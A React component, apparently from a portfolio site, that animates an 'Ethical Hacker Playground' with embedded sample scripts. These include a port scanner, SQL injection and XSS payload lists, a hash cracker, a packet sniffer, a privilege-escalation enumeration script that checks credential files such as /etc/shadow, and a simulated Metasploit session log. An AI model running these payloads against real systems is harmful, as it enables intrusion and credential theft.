'use client'

import { useState, useEffect, useRef, useCallback } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Terminal, Play, Pause, RotateCcw, Wifi, Globe, Server,
  Shield, AlertTriangle, Check, X, Skull, Eye, Lock, Database,
  Network, Zap, Bug, FileCode, Activity, Radio
} from 'lucide-react'
import { cn } from '@/lib/utils'

// ============================================
// HACKING CODE SNIPPETS FOR AUTO-TYPING
// ============================================

const hackingScripts = [
  {
    title: 'Network Reconnaissance',
    code: `#!/usr/bin/env python3
# Network Reconnaissance Tool
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

class NetworkScanner:
    def __init__(self, target, port_range=(1, 1024)):
        self.target = target
        self.port_range = port_range
        self.open_ports = []

    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                service = socket.getservbyport(port, 'tcp')
                self.open_ports.append({'port': port, 'service': service})
                print(f"[+] Port {port} OPEN - {service}")
            sock.close()
        except:
            pass

    def run_scan(self):
        print(f"[*] Starting scan on {self.target}")
        print(f"[*] Scanning ports {self.port_range[0]}-{self.port_range[1]}")

        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.scan_port, range(*self.port_range))

        print(f"[+] Scan complete. Found {len(self.open_ports)} open ports")
        return self.open_ports

scanner = NetworkScanner("192.168.1.1", (1, 1000))
results = scanner.run_scan()`,
  },
  {
    title: 'SQL Injection Detector',
    code: `// SQL Injection Vulnerability Scanner
const payloads = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1' AND 1=1 --",
  "admin'--",
  "1; EXEC xp_cmdshell('dir') --",
  "' UNION SELECT NULL, username, password FROM users --"
];

async function testSQLInjection(url, param) {
  console.log(\`[*] Testing: \${url}\`);
  console.log(\`[*] Parameter: \${param}\`);

  for (const payload of payloads) {
    const testUrl = \`\${url}?\${param}=\${encodeURIComponent(payload)}\`;

    try {
      const response = await fetch(testUrl);
      const body = await response.text();

      // Check for SQL error messages
      const sqlErrors = [
        'SQL syntax',
        'mysql_fetch',
        'ORA-',
        'PostgreSQL',
        'sqlite3',
        'ODBC',
        'syntax error'
      ];

      for (const error of sqlErrors) {
        if (body.includes(error)) {
          console.log(\`[!] VULNERABLE: \${payload}\`);
          console.log(\`[!] Error detected: \${error}\`);
          return { vulnerable: true, payload, error };
        }
      }
    } catch (e) {
      console.log(\`[-] Request failed: \${e.message}\`);
    }
  }

  console.log('[+] No SQL injection detected');
  return { vulnerable: false };
}

// Start scan
testSQLInjection('https://target.com/search', 'query');`,
  },
  {
    title: 'Cryptographic Hash Cracker',
    code: `#!/usr/bin/env python3
"""
Password Hash Cracker - Educational Purpose Only
Supports: MD5, SHA1, SHA256, SHA512
"""
import hashlib
import itertools
import string
from typing import Optional

class HashCracker:
    ALGORITHMS = {
        32: 'md5',
        40: 'sha1',
        64: 'sha256',
        128: 'sha512'
    }

    def __init__(self, target_hash: str):
        self.target = target_hash.lower()
        self.algorithm = self.detect_algorithm()
        self.attempts = 0

    def detect_algorithm(self) -> str:
        return self.ALGORITHMS.get(len(self.target), 'unknown')

    def hash_string(self, text: str) -> str:
        hasher = hashlib.new(self.algorithm)
        hasher.update(text.encode())
        return hasher.hexdigest()

    def dictionary_attack(self, wordlist: list) -> Optional[str]:
        print(f"[*] Starting dictionary attack...")
        print(f"[*] Algorithm: {self.algorithm.upper()}")
        print(f"[*] Wordlist size: {len(wordlist)}")

        for word in wordlist:
            self.attempts += 1
            if self.hash_string(word) == self.target:
                print(f"[+] CRACKED: {word}")
                print(f"[+] Attempts: {self.attempts}")
                return word

        print(f"[-] Not found in wordlist")
        return None

    def brute_force(self, max_length: int = 6) -> Optional[str]:
        charset = string.ascii_lowercase + string.digits
        print(f"[*] Starting brute force...")
        print(f"[*] Max length: {max_length}")

        for length in range(1, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                attempt = ''.join(combo)
                self.attempts += 1

                if self.attempts % 100000 == 0:
                    print(f"[*] Tried: {self.attempts}")

                if self.hash_string(attempt) == self.target:
                    print(f"[+] CRACKED: {attempt}")
                    return attempt

        return None

# Target hash (MD5 of "password123")
cracker = HashCracker("482c811da5d5b4bc6d497ffa98491e38")
cracker.dictionary_attack(["admin", "password", "password123", "12345"])`,
  },
  {
    title: 'XSS Vulnerability Scanner',
    code: `// Cross-Site Scripting (XSS) Scanner
class XSSScanner {
  constructor(targetUrl) {
    this.target = targetUrl;
    this.payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "'-alert('XSS')-'",
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '{{constructor.constructor("alert(1)")()}}',
    ];
    this.results = [];
  }

  async testEndpoint(endpoint, param) {
    console.log(\`\\n[*] Testing endpoint: \${endpoint}\`);
    console.log(\`[*] Parameter: \${param}\`);

    for (const payload of this.payloads) {
      const encodedPayload = encodeURIComponent(payload);
      const testUrl = \`\${this.target}\${endpoint}?\${param}=\${encodedPayload}\`;

      try {
        const response = await fetch(testUrl, {
          method: 'GET',
          headers: { 'X-Scanner': 'XSS-Test' }
        });

        const body = await response.text();

        // Check if payload is reflected unescaped
        if (body.includes(payload) || body.includes(payload.replace(/"/g, "'"))) {
          console.log(\`[!] REFLECTED XSS FOUND!\`);
          console.log(\`[!] Payload: \${payload}\`);

          this.results.push({
            endpoint,
            param,
            payload,
            type: 'reflected',
            severity: 'HIGH'
          });
        }
      } catch (error) {
        console.log(\`[-] Error: \${error.message}\`);
      }
    }
  }

  generateReport() {
    console.log('\\n========== SCAN REPORT ==========');
    console.log(\`Total vulnerabilities: \${this.results.length}\`);
    this.results.forEach((r, i) => {
      console.log(\`\\n[\${i + 1}] \${r.type.toUpperCase()} XSS\`);
      console.log(\`    Endpoint: \${r.endpoint}\`);
      console.log(\`    Severity: \${r.severity}\`);
    });
  }
}

const scanner = new XSSScanner('https://target.com');
await scanner.testEndpoint('/search', 'q');
scanner.generateReport();`,
  },
  {
    title: 'Packet Sniffer Analysis',
    code: `#!/usr/bin/env python3
"""
Network Packet Analyzer
Captures and analyzes network traffic patterns
"""
from scapy.all import *
from collections import defaultdict
import datetime

class PacketAnalyzer:
    def __init__(self):
        self.packet_count = 0
        self.protocols = defaultdict(int)
        self.connections = defaultdict(list)
        self.suspicious = []

    def analyze_packet(self, packet):
        self.packet_count += 1
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")

        # Analyze IP layer
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst
            proto = packet[IP].proto

            # Protocol analysis
            if TCP in packet:
                self.protocols['TCP'] += 1
                sport = packet[TCP].sport
                dport = packet[TCP].dport
                flags = packet[TCP].flags

                # Detect port scanning
                if flags == 'S':  # SYN packet
                    self.connections[src].append(dport)
                    if len(set(self.connections[src])) > 20:
                        self.suspicious.append({
                            'type': 'PORT_SCAN',
                            'source': src,
                            'ports': len(self.connections[src])
                        })
                        print(f"[!] {timestamp} PORT SCAN from {src}")

                # Detect suspicious ports
                suspicious_ports = [4444, 5555, 6666, 31337]
                if dport in suspicious_ports:
                    print(f"[!] {timestamp} Suspicious: {src} -> {dst}:{dport}")

            elif UDP in packet:
                self.protocols['UDP'] += 1

            elif ICMP in packet:
                self.protocols['ICMP'] += 1
                # Detect ICMP flood
                if packet[ICMP].type == 8:
                    print(f"[*] {timestamp} ICMP Echo: {src} -> {dst}")

        # Log packet summary
        if self.packet_count % 100 == 0:
            print(f"[*] Analyzed {self.packet_count} packets")
            self.print_stats()

    def print_stats(self):
        print("\\n=== Protocol Distribution ===")
        for proto, count in self.protocols.items():
            pct = (count / self.packet_count) * 100
            print(f"  {proto}: {count} ({pct:.1f}%)")

analyzer = PacketAnalyzer()
print("[*] Starting packet capture...")
sniff(prn=analyzer.analyze_packet, count=1000)`,
  },
  {
    title: 'Privilege Escalation Check',
    code: `#!/bin/bash
# Linux Privilege Escalation Enumeration Script
# For authorized security testing only

echo "[*] Starting privilege escalation enumeration..."
echo "[*] Current user: $(whoami)"
echo "[*] Hostname: $(hostname)"
echo ""

# Check for SUID binaries
echo "=== SUID Binaries ==="
find / -perm -u=s -type f 2>/dev/null | while read binary; do
    echo "[+] Found: $binary"
    # Check GTFOBins exploitable
    case $(basename "$binary") in
        vim|vi|nano|less|more|find|awk|python*|perl|php|ruby)
            echo "[!] EXPLOITABLE: $binary"
            ;;
    esac
done

# Check sudo permissions
echo ""
echo "=== Sudo Permissions ==="
sudo -l 2>/dev/null | grep -v "not allowed"

# Check writable paths
echo ""
echo "=== Writable Directories in PATH ==="
echo $PATH | tr ':' '\\n' | while read path; do
    if [ -w "$path" ]; then
        echo "[!] Writable: $path"
    fi
done

# Check for credentials
echo ""
echo "=== Interesting Files ==="
files=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/sudoers"
    "~/.ssh/id_rsa"
    "~/.bash_history"
    "/var/log/auth.log"
)

for file in "\${files[@]}"; do
    if [ -r "$file" ]; then
        echo "[+] Readable: $file"
    fi
done

# Check running processes
echo ""
echo "=== Interesting Processes ==="
ps aux | grep -E "(root|mysql|postgres)" | grep -v grep

# Check cron jobs
echo ""
echo "=== Cron Jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo ""
echo "[*] Enumeration complete!"`,
  },
]

// ============================================
// AUTO-TYPING TERMINAL COMPONENT
// ============================================

function AutoTypingCode({
  code,
  speed = 15,
  isActive = true,
  onComplete
}: {
  code: string
  speed?: number
  isActive?: boolean
  onComplete?: () => void
}) {
  const [displayedCode, setDisplayedCode] = useState('')
  const [currentIndex, setCurrentIndex] = useState(0)
  const containerRef = useRef<HTMLPreElement>(null)

  useEffect(() => {
    if (!isActive) return

    if (currentIndex < code.length) {
      const timer = setTimeout(() => {
        setDisplayedCode(prev => prev + code[currentIndex])
        setCurrentIndex(prev => prev + 1)

        // Auto scroll
        if (containerRef.current) {
          containerRef.current.scrollTop = containerRef.current.scrollHeight
        }
      }, speed)

      return () => clearTimeout(timer)
    } else if (onComplete) {
      onComplete()
    }
  }, [currentIndex, code, speed, isActive, onComplete])

  useEffect(() => {
    setDisplayedCode('')
    setCurrentIndex(0)
  }, [code])

  return (
    <pre
      ref={containerRef}
      className="text-xs md:text-sm font-mono overflow-auto h-full scrollbar-thin scrollbar-track-transparent scrollbar-thumb-green-500/30"
    >
      <code className="text-green-400 whitespace-pre-wrap">
        {displayedCode}
        <span className="animate-pulse text-green-500">█</span>
      </code>
    </pre>
  )
}

// ============================================
// NETWORK SCAN SIMULATION
// ============================================

interface ScanResult {
  ip: string
  port: number
  service: string
  status: 'open' | 'closed' | 'filtered'
  vulnerability?: string
}

function NetworkScanSimulation({ isActive }: { isActive: boolean }) {
  const [results, setResults] = useState<ScanResult[]>([])
  const [scanning, setScanning] = useState(false)
  const [progress, setProgress] = useState(0)
  const [currentTarget, setCurrentTarget] = useState('')

  const services = ['SSH', 'HTTP', 'HTTPS', 'FTP', 'SMTP', 'MySQL', 'PostgreSQL', 'Redis', 'MongoDB', 'RDP']
  const vulns = ['CVE-2024-1234', 'CVE-2023-5678', 'Weak Config', 'Default Creds', 'Outdated Version']

  useEffect(() => {
    if (!isActive) return

    setScanning(true)
    setResults([])
    setProgress(0)

    const generateResult = (index: number): ScanResult => {
      const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
      const port = [22, 80, 443, 21, 25, 3306, 5432, 6379, 27017, 3389][Math.floor(Math.random() * 10)]
      const service = services[Math.floor(Math.random() * services.length)]
      const status = Math.random() > 0.3 ? 'open' : Math.random() > 0.5 ? 'filtered' : 'closed'
      const vulnerability = status === 'open' && Math.random() > 0.6 ? vulns[Math.floor(Math.random() * vulns.length)] : undefined

      return { ip, port, service, status, vulnerability }
    }

    let index = 0
    const maxResults = 20

    const interval = setInterval(() => {
      if (index >= maxResults) {
        setScanning(false)
        clearInterval(interval)
        return
      }

      const result = generateResult(index)
      setCurrentTarget(`${result.ip}:${result.port}`)
      setResults(prev => [...prev, result])
      setProgress(((index + 1) / maxResults) * 100)
      index++
    }, 800)

    return () => clearInterval(interval)
  }, [isActive])

  return (
    <div className="space-y-3 h-full overflow-auto">
      {/* Scan Progress */}
      <div className="flex items-center gap-2 text-xs">
        <Activity className={cn("w-4 h-4", scanning ? "text-green-500 animate-pulse" : "text-muted-foreground")} />
        <span className="text-green-400 font-mono">
          {scanning ? `Scanning: ${currentTarget}` : 'Scan Complete'}
        </span>
      </div>

      <div className="h-1 bg-muted rounded-full overflow-hidden">
        <motion.div
          className="h-full bg-green-500"
          initial={{ width: 0 }}
          animate={{ width: `${progress}%` }}
        />
      </div>

      {/* Results */}
      <div className="space-y-1 font-mono text-xs">
        <AnimatePresence>
          {results.map((result, i) => (
            <motion.div
              key={`${result.ip}-${result.port}-${i}`}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              className={cn(
                "flex items-center justify-between p-1.5 rounded",
                result.vulnerability ? "bg-red-500/10 border border-red-500/30" :
                result.status === 'open' ? "bg-green-500/10" : "bg-muted/30"
              )}
            >
              <div className="flex items-center gap-2">
                {result.status === 'open' ? (
                  <Check className="w-3 h-3 text-green-500" />
                ) : result.status === 'filtered' ? (
                  <AlertTriangle className="w-3 h-3 text-yellow-500" />
                ) : (
                  <X className="w-3 h-3 text-red-500" />
                )}
                <span className="text-green-400">{result.ip}</span>
                <span className="text-muted-foreground">:</span>
                <span className="text-cyan-400">{result.port}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-muted-foreground">{result.service}</span>
                {result.vulnerability && (
                  <span className="text-red-400 text-[10px] px-1 bg-red-500/20 rounded">
                    {result.vulnerability}
                  </span>
                )}
              </div>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  )
}

// ============================================
// MATRIX RAIN EFFECT
// ============================================

function MatrixRain({ active }: { active: boolean }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)

  useEffect(() => {
    if (!active) return

    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const resizeCanvas = () => {
      canvas.width = canvas.offsetWidth
      canvas.height = canvas.offsetHeight
    }
    resizeCanvas()
    window.addEventListener('resize', resizeCanvas)

    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZアイウエオカキクケコサシスセソタチツテト'
    const fontSize = 14
    const columns = canvas.width / fontSize
    const drops: number[] = []

    for (let i = 0; i < columns; i++) {
      drops[i] = Math.random() * -100
    }

    const draw = () => {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      ctx.fillStyle = '#0f0'
      ctx.font = `${fontSize}px monospace`

      for (let i = 0; i < drops.length; i++) {
        const char = chars[Math.floor(Math.random() * chars.length)]
        ctx.fillText(char, i * fontSize, drops[i] * fontSize)

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0
        }
        drops[i]++
      }
    }

    const interval = setInterval(draw, 33)

    return () => {
      clearInterval(interval)
      window.removeEventListener('resize', resizeCanvas)
    }
  }, [active])

  return (
    <canvas
      ref={canvasRef}
      className="absolute inset-0 w-full h-full opacity-30"
    />
  )
}

// ============================================
// TERMINAL OUTPUT SIMULATION
// ============================================

function TerminalOutput({ isActive }: { isActive: boolean }) {
  const [lines, setLines] = useState<{ text: string; type: 'info' | 'success' | 'warning' | 'error' }[]>([])
  const containerRef = useRef<HTMLDivElement>(null)

  const outputs = [
    { text: '[*] Initializing exploit framework...', type: 'info' as const },
    { text: '[*] Loading modules...', type: 'info' as const },
    { text: '[+] Module: auxiliary/scanner/portscan/tcp loaded', type: 'success' as const },
    { text: '[+] Module: exploit/multi/handler loaded', type: 'success' as const },
    { text: '[*] Setting RHOSTS to 192.168.1.0/24', type: 'info' as const },
    { text: '[*] Setting THREADS to 50', type: 'info' as const },
    { text: '[*] Starting scan...', type: 'info' as const },
    { text: '[+] 192.168.1.1:22 - SSH Open', type: 'success' as const },
    { text: '[+] 192.168.1.1:80 - HTTP Open', type: 'success' as const },
    { text: '[!] 192.168.1.5:445 - SMB vulnerable to EternalBlue', type: 'warning' as const },
    { text: '[!] 192.168.1.10:3389 - RDP BlueKeep vulnerable', type: 'warning' as const },
    { text: '[*] Checking CVE-2024-1234...', type: 'info' as const },
    { text: '[+] Vulnerability confirmed!', type: 'success' as const },
    { text: '[*] Generating payload...', type: 'info' as const },
    { text: '[-] Connection refused by target', type: 'error' as const },
    { text: '[*] Retrying with different vector...', type: 'info' as const },
    { text: '[+] Session 1 opened (192.168.1.100:4444 -> 192.168.1.5:49521)', type: 'success' as const },
    { text: '[*] Meterpreter session 1 opened', type: 'info' as const },
    { text: '[+] Privilege escalation successful', type: 'success' as const },
    { text: '[*] Dumping credentials...', type: 'info' as const },
    { text: '[+] Found 15 password hashes', type: 'success' as const },
    { text: '[*] Running post-exploitation modules...', type: 'info' as const },
    { text: '[+] Persistence established', type: 'success' as const },
    { text: '[*] Cleaning up artifacts...', type: 'info' as const },
    { text: '[+] Operation complete', type: 'success' as const },
  ]

  useEffect(() => {
    if (!isActive) return

    setLines([])
    let index = 0

    const interval = setInterval(() => {
      if (index >= outputs.length) {
        index = 0
        setLines([])
      }

      setLines(prev => [...prev.slice(-15), outputs[index]])
      index++

      if (containerRef.current) {
        containerRef.current.scrollTop = containerRef.current.scrollHeight
      }
    }, 600)

    return () => clearInterval(interval)
  }, [isActive])

  return (
    <div ref={containerRef} className="font-mono text-xs space-y-0.5 overflow-auto h-full">
      <AnimatePresence>
        {lines.map((line, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -5 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0 }}
            className={cn(
              line.type === 'info' && 'text-cyan-400',
              line.type === 'success' && 'text-green-400',
              line.type === 'warning' && 'text-yellow-400',
              line.type === 'error' && 'text-red-400',
            )}
          >
            {line.text}
          </motion.div>
        ))}
      </AnimatePresence>
      <span className="text-green-500 animate-pulse">_</span>
    </div>
  )
}

// ============================================
// THREAT MONITOR DISPLAY
// ============================================

function ThreatMonitor({ isActive }: { isActive: boolean }) {
  const [threats, setThreats] = useState<{ id: number; type: string; source: string; severity: string; time: string }[]>([])

  const threatTypes = [
    { type: 'Brute Force Attack', severity: 'HIGH', icon: '🔓' },
    { type: 'SQL Injection Attempt', severity: 'CRITICAL', icon: '💉' },
    { type: 'XSS Payload Detected', severity: 'MEDIUM', icon: '📝' },
    { type: 'Port Scan Detected', severity: 'LOW', icon: '🔍' },
    { type: 'Malware Signature', severity: 'CRITICAL', icon: '🦠' },
    { type: 'Privilege Escalation', severity: 'HIGH', icon: '⬆️' },
    { type: 'Data Exfiltration', severity: 'CRITICAL', icon: '📤' },
    { type: 'Suspicious Login', severity: 'MEDIUM', icon: '🔑' },
  ]

  useEffect(() => {
    if (!isActive) return

    const interval = setInterval(() => {
      const threat = threatTypes[Math.floor(Math.random() * threatTypes.length)]
      const newThreat = {
        id: Date.now(),
        type: threat.type,
        source: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        severity: threat.severity,
        time: new Date().toLocaleTimeString(),
      }

      setThreats(prev => [newThreat, ...prev.slice(0, 7)])
    }, 2000)

    return () => clearInterval(interval)
  }, [isActive])

  return (
    <div className="space-y-2 font-mono text-xs">
      <div className="flex items-center gap-2 mb-3">
        <Radio className="w-4 h-4 text-red-500 animate-pulse" />
        <span className="text-red-400">LIVE THREAT MONITOR</span>
      </div>

      <AnimatePresence>
        {threats.map((threat) => (
          <motion.div
            key={threat.id}
            initial={{ opacity: 0, y: -10, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className={cn(
              "p-2 rounded border",
              threat.severity === 'CRITICAL' && "bg-red-500/10 border-red-500/30",
              threat.severity === 'HIGH' && "bg-orange-500/10 border-orange-500/30",
              threat.severity === 'MEDIUM' && "bg-yellow-500/10 border-yellow-500/30",
              threat.severity === 'LOW' && "bg-blue-500/10 border-blue-500/30",
            )}
          >
            <div className="flex items-center justify-between">
              <span className={cn(
                "font-bold",
                threat.severity === 'CRITICAL' && "text-red-400",
                threat.severity === 'HIGH' && "text-orange-400",
                threat.severity === 'MEDIUM' && "text-yellow-400",
                threat.severity === 'LOW' && "text-blue-400",
              )}>
                {threat.type}
              </span>
              <span className="text-muted-foreground text-[10px]">{threat.time}</span>
            </div>
            <div className="flex items-center justify-between mt-1">
              <span className="text-muted-foreground">Source: {threat.source}</span>
              <span className={cn(
                "px-1.5 py-0.5 rounded text-[10px] font-bold",
                threat.severity === 'CRITICAL' && "bg-red-500/20 text-red-400",
                threat.severity === 'HIGH' && "bg-orange-500/20 text-orange-400",
                threat.severity === 'MEDIUM' && "bg-yellow-500/20 text-yellow-400",
                threat.severity === 'LOW' && "bg-blue-500/20 text-blue-400",
              )}>
                {threat.severity}
              </span>
            </div>
          </motion.div>
        ))}
      </AnimatePresence>
    </div>
  )
}

// ============================================
// MAIN HACKER PLAYGROUND COMPONENT
// ============================================

type PlaygroundMode = 'code' | 'scan' | 'terminal' | 'threats'

export function HackerPlayground() {
  const [isPlaying, setIsPlaying] = useState(true)
  const [currentScriptIndex, setCurrentScriptIndex] = useState(0)
  const [mode, setMode] = useState<PlaygroundMode>('code')
  const [showMatrix, setShowMatrix] = useState(true)

  const handleNextScript = useCallback(() => {
    setCurrentScriptIndex(prev => (prev + 1) % hackingScripts.length)
  }, [])

  const handleReset = () => {
    setCurrentScriptIndex(0)
    setIsPlaying(true)
  }

  const modes: { id: PlaygroundMode; label: string; icon: typeof Terminal }[] = [
    { id: 'code', label: 'Live Coding', icon: FileCode },
    { id: 'scan', label: 'Network Scan', icon: Network },
    { id: 'terminal', label: 'Exploit Run', icon: Terminal },
    { id: 'threats', label: 'Threat Feed', icon: Shield },
  ]

  return (
    <div className="relative">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center">
            <Skull className="w-5 h-5 text-green-500" />
          </div>
          <div>
            <h3 className="font-bold text-lg">Ethical Hacker Playground</h3>
            <p className="text-xs text-muted-foreground">Live security demonstration & showcase</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setShowMatrix(!showMatrix)}
            className={cn(
              "p-2 rounded-lg transition-colors",
              showMatrix ? "bg-green-500/20 text-green-400" : "bg-muted text-muted-foreground"
            )}
            title="Toggle Matrix Effect"
          >
            <Eye className="w-4 h-4" />
          </button>
          <button
            onClick={() => setIsPlaying(!isPlaying)}
            className="p-2 bg-muted rounded-lg hover:bg-muted/80 transition-colors"
            title={isPlaying ? 'Pause' : 'Play'}
          >
            {isPlaying ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4" />}
          </button>
          <button
            onClick={handleReset}
            className="p-2 bg-muted rounded-lg hover:bg-muted/80 transition-colors"
            title="Reset"
          >
            <RotateCcw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Mode Selector */}
      <div className="flex flex-wrap gap-2 mb-4">
        {modes.map((m) => (
          <button
            key={m.id}
            onClick={() => setMode(m.id)}
            className={cn(
              "flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm font-medium transition-all",
              mode === m.id
                ? "bg-green-500/20 text-green-400 border border-green-500/30"
                : "bg-muted text-muted-foreground hover:text-foreground"
            )}
          >
            <m.icon className="w-4 h-4" />
            {m.label}
          </button>
        ))}
      </div>

      {/* Main Terminal Window */}
      <div className="relative rounded-xl overflow-hidden border border-green-500/30 bg-black">
        {/* Matrix Background */}
        {showMatrix && <MatrixRain active={isPlaying} />}

        {/* Terminal Header */}
        <div className="relative z-10 flex items-center justify-between px-4 py-2 bg-zinc-900/90 border-b border-green-500/20">
          <div className="flex items-center gap-2">
            <div className="w-3 h-3 rounded-full bg-red-500" />
            <div className="w-3 h-3 rounded-full bg-yellow-500" />
            <div className="w-3 h-3 rounded-full bg-green-500" />
          </div>
          <div className="text-xs font-mono text-green-400 flex items-center gap-2">
            <Terminal className="w-3 h-3" />
            {mode === 'code' && hackingScripts[currentScriptIndex].title}
            {mode === 'scan' && 'Network Scanner v2.1'}
            {mode === 'terminal' && 'Metasploit Framework'}
            {mode === 'threats' && 'Security Operations Center'}
          </div>
          <div className="text-xs text-muted-foreground font-mono">
            {mode === 'code' && `${currentScriptIndex + 1}/${hackingScripts.length}`}
          </div>
        </div>

        {/* Content Area */}
        <div className="relative z-10 h-[400px] md:h-[500px] p-4 bg-black/70">
          {mode === 'code' && (
            <AutoTypingCode
              code={hackingScripts[currentScriptIndex].code}
              speed={12}
              isActive={isPlaying}
              onComplete={handleNextScript}
            />
          )}
          {mode === 'scan' && <NetworkScanSimulation isActive={isPlaying} />}
          {mode === 'terminal' && <TerminalOutput isActive={isPlaying} />}
          {mode === 'threats' && <ThreatMonitor isActive={isPlaying} />}
        </div>

        {/* Status Bar */}
        <div className="relative z-10 flex items-center justify-between px-4 py-2 bg-zinc-900/90 border-t border-green-500/20 text-xs font-mono">
          <div className="flex items-center gap-4">
            <span className="flex items-center gap-1 text-green-400">
              <Zap className="w-3 h-3" />
              Active
            </span>
            <span className="text-muted-foreground">
              {mode === 'code' && 'Python / JavaScript / Bash'}
              {mode === 'scan' && 'Nmap-style Scanner'}
              {mode === 'terminal' && 'msf6 >'}
              {mode === 'threats' && 'Real-time Monitoring'}
            </span>
          </div>
          <div className="flex items-center gap-4 text-muted-foreground">
            <span className="flex items-center gap-1">
              <Server className="w-3 h-3" />
              192.168.1.100
            </span>
            <span className="flex items-center gap-1">
              <Lock className="w-3 h-3 text-green-500" />
              Encrypted
            </span>
          </div>
        </div>
      </div>

      {/* Disclaimer */}
      <div className="mt-4 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
        <div className="flex items-start gap-2">
          <AlertTriangle className="w-4 h-4 text-yellow-500 mt-0.5 flex-shrink-0" />
          <p className="text-xs text-muted-foreground">
            <span className="font-bold text-yellow-500">Educational Purpose Only:</span> This is a simulation/showcase demonstrating security concepts and coding patterns.
            All code examples are for learning purposes. Always obtain proper authorization before testing security on any system.
          </p>
        </div>
      </div>
    </div>
  )
}

export default HackerPlayground
